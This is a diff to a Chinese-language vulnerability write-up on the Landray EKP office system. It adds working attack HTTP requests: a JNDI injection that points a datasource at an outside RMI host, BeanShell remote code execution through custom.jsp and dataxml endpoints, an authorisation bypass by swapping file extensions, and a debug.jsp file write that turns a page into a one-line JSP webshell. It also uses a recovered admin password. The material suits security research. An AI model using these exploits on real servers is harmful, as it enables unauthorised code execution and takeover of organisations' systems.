@@ -15,10 +15,17 @@
 *   （12）如果想要调试蓝凌EKP的代码，可以在服务器启动时采用命令`.\catalina.bat jpda start`启动服务器，这样默认的监听端口为8000
 
 ## 路由分析
+*   所有jsp或class的访问路径为该文件到ekp目录之前的相对路径，例如`/ekp/sys/common/dataxml.jsp`
+*   所有的配置文件位于`/ekp/WEB-INF/KmssConfig`文件夹下，根据jsp或class对应的文件夹路径，可在KmssConfig下查找该路径下的各类配置内容。
+
 
 ## 已知漏洞
  - [1.custom.jsp文件读取漏洞](#custom文件读取)
  - [2.admin.do jndi漏洞](#jndi攻击admin)
+ - [3.BeanShell漏洞](#利用beanshell进行攻击)
+ - [4.jsp未授权访问漏洞](#jsp未授权访问)
+ - [5.XMLdecode反序列化漏洞](#xmldecode反序列化)
+ - [6.debug.jsp写文件漏洞](#debug_jsp写文件)
 
 ### custom文件读取
 custom.jsp文件内容如下
@@ -71,3 +78,149 @@ Password1
 ```
 
 ### jndi攻击admin
+通过customs.jsp得到admin的密码`Password1`，用这个密码可以登陆`http://ip:8080/ekp/admin.do`，然后在系统配置的数据库配置中选择JNDI，页面会多出一行数据源名称的选项，填入`rmi://172.16.165.1:1099/lpkz0d`，点击测试按钮成功执行。拦截的数据包内容如下
+```
+POST /ekp/admin.do HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+method=testDbConn&datasource=rmi%3A%2F%2F172.16.165.1%3A1099%2Flpkz0d
+```
+
+### 利用beanshell进行攻击
+BeanShell漏洞在国产化软件中很常见，泛微OA、用友NC等都出现过BeanShell漏洞。BeanShell可以在运行时动态执行Java代码，在应用程序的开发中提供很好的可扩展性。其对应的jar包名为`bsh-2.0b4.jar`，只要在lib中看到此jar包都可以查找其相关的入口。最终bsh执行java代码的示例如下
+```
+Interpreter interpreter = new Interpreter();
+Object object=interpreter.eval("exec(\"whoami\")");
+```
+在蓝凌的`/ekp/WEB-INF/class`的源码中搜索形如上述代码存在的类
+```
+com.landray.kmss.sys.formula.parser.FormulaParser#parseValueScript
+com.landray.kmss.sys.iassister.util.FormulaUtil#parseValueScript
+com.landray.kmss.sys.lbpmservice.node.robotnode.support.RobotNodeRunScriptServiceImp#execute
+com.landray.kmss.sys.modeling.base.util.ModelingFormulaUtil#parseValueScript
+com.landray.kmss.sys.rule.parser.RuleEngineParser#parseValueScript
+com.landray.kmss.tic.core.cacheindb.util.ToolUtil#transDataByImpl
+com.landray.kmss.tic.sap.sync.service.spring.TicSapSyncUniteQuartzService#findDeleteField
+```
+上述很多类的执行方法为`parseValueScript()`，查找该方法在web目录下的调用类，包括`SysFormulaValidate、SysFormulaValidateByJS、SysFormulaValidateByScriptEngine、SysFormulaSimulateByJS`等（这些类都实现了IXMLDataBean接口），并且这些类对`parseValueScript()`的调用方法都是`getDataList(RequestContext requestInfo)`。查找调用`getDataList()`方法的类，发现存在一个Controller——`com.landray.kmss.common.actions.DataController`，这个Controller标注的路由为`/data/sys-common`。并且在`datajson()、dataxml()、treexml()`等方法中都调用了`getDataList()`
+```java
+@RequestMapping(value = {"datajson"}, produces = {"application/json;charset=UTF-8"})
+  @ResponseBody
+  public RestResponse<JSONArray> datajson(HttpServletRequest request, HttpServletResponse response) throws Exception {
+    String s_bean = request.getParameter("s_bean");
+    JSONArray array = new JSONArray();
+    JSONArray jsonArray = null;
+    try {
+      Assert.notNull(s_bean, ");
+      RequestContext requestInfo = new RequestContext(request, true);
+      String[] beanList = s_bean.split(";");
+      List result = null;
+      for (int i = 0; i < beanList.length; i++) {
+        IXMLDataBean treeBean = (IXMLDataBean)SpringBeanUtil.getBean(beanList[i]); // s_bean的值对应某个实现自IXMLDataBean接口的类
+        result = treeBean.getDataList(requestInfo); // 触发getDataList
+	...
+}
+```
+另外，发现类似的代码也出现在jsp文件中，如dataxml.jsp、datajson.jsp、treexml.jsp等
+```jsp
+<%@ page import="org.springframework.context.ApplicationContext,
+	org.springframework.web.context.support.WebApplicationContextUtils,
+	com.landray.kmss.common.service.IXMLDataBean,
+	com.landray.kmss.common.actions.RequestContext,
+	com.landray.kmss.util.StringUtil,
+	org.apache.commons.lang.StringEscapeUtils,
+	java.util.*
+"%>
+RequestContext requestInfo = new RequestContext(request);
+String[] beanList = request.getParameter("s_bean").split(";");
+IXMLDataBean treeBean;
+
+sout.append("<dataList>");
+for(i=0; i<beanList.length; i++){
+    treeBean = (IXMLDataBean) ctx.getBean(beanList[i]);
+    nodes = treeBean.getDataList(requestInfo);
+    ...
+}
+```
+最终搜索到的能触发BeanShell的路径如下（如果是通过customs.jsp访问其他jsp文件，则不需要`/ekp/`前缀路径）
+```
+/ekp/sys/common/dataxml.jsp
+/ekp/sys/common/datajson.jsp
+/ekp/sys/common/treexml.jsp
+/ekp/sys/common/treejson.jsp
+/ekp/data/sys-common/dataxml
+/ekp/data/sys-common/datajson
+/ekp/data/sys-common/treexml
+```
+发送的请求数据包如下
+```
+POST /ekp/sys/ui/extend/varkind/custom.jsp HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+var={"body":{"file":"/sys/common/dataxml.jsp"}}&s_bean=sysFormulaValidate&script=Runtime.getRuntime().exec("calc")&type=int&modelName=test
+```
+
+与之类似的还有erp_data.jsp，但它的接受bean的参数为`String service=request.getParameter("erpServcieName");`，发送请求时只需要将上述的s_bean换为erpServcieName
+```
+/tic/core/resource/js/erp_data.jsp
+```
+
+
+### jsp未授权访问
+BeanShell攻击中用到的jsp文件都是需要访问权限的，其访问路径均为`/sys/common/xx.jsp`，对应的配置文件为`/ekp/WEB-INF/KmssConfig/sys/authentication/spring.xml`，部分内容如下，可以看到对于sys目录下的静态文件，都采用resourceCacheFilter进行过滤，但是该过滤器没有权限校验过程
+```xml
+    <bean id="org.springframework.security.filterChainProxy" 
+        name="springSecurityFilterChain"
+        class="org.springframework.security.web.FilterChainProxy">
+        <constructor-arg>
+             <list value-type="org.springframework.security.web.SecurityFilterChain">
+                <sec:filter-chain pattern="/**/*.gif" filters="resourceCacheFilter" />
+                <sec:filter-chain pattern="/**/*.jpg" filters="resourceCacheFilter" />  
+                <sec:filter-chain pattern="/**/*.png" filters="resourceCacheFilter" />  
+                <sec:filter-chain pattern="/**/*.bmp" filters="resourceCacheFilter" />  
+                <sec:filter-chain pattern="/**/*.ico" filters="resourceCacheFilter" />  
+                <sec:filter-chain pattern="/**/*.css" filters="resourceCacheFilter,gzipFilter" />
+                <sec:filter-chain pattern="/**/*.js" filters="resourceCacheFilter,gzipFilter" />  
+                <sec:filter-chain pattern="/**/*.tmpl" filters="resourceCacheFilter,gzipFilter" />  
+                <sec:filter-chain pattern="/**/*.html" filters="gzipFilter" />
+                <sec:filter-chain pattern="/api/**" filters="restApiAuthFilter" />                
+                <!-- 其它资源 kmssSessionManagerFilter -->
+                <sec:filter-chain  pattern="/**"
+                    filters="securityContextPersistenceFilter,
+                    sysLogOperFilter,
+                    concurrentSessionFilter,
+                    kmssProcessingFilterProxy,
+                    exceptionTranslationFilter,
+                    filterInvocationInterceptor" />
+             </list>
+         </constructor-arg>
+    </bean>
+```
+所以可以不通过custom.jsp的方式来访问这些jsp，可以采用更改jsp文件后缀的方式，例如想要访问dataxml.jsp，可以将其改为访问dataxml.js或者dataxml.tmpl等方式
+```
+POST /data/sys-common/dataxml.js HTTP/1.1
+Host: test.com
+Content-Type: application/x-www-form-urlencoded
+
+s_bean=sysFormulaValidate&script=Runtime.getRuntime().exec("calc.exe");
+```
+
+### xmldecode反序列化
+
+### debug_jsp写文件
+漏洞位于`/ekp/sys/common/debug.jsp`，fdCode传入的内容会直接写入到`<" + "% " + code + " %" + ">";`code的位置，然后将这段jsp代码写入到`/sys/common/code.jsp`中
+```
+<%
+    String code = request.getParameter("fdCode");
+    if(code!=null){
+        code = "<"+"%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\""+ " pageEncoding=\"UTF-8\"%"+"><" + "% " + code + " %" + ">";
+        FileOutputStream outputStream = new FileOutputStream(ConfigLocationsUtil.getWebContentPath()+"/sys/common/code.jsp");
+        BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(outputStream, "UTF-8"));
+	bw.write(code);
+	bw.close();
+%>
+```
+Java最简单的一句话木马如下，现在debug.jsp提供了木马两侧的格式`<% code %>`，只需要将木马内容填入，即可将code.jsp变成一个恶意木马
+```
+<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
+```
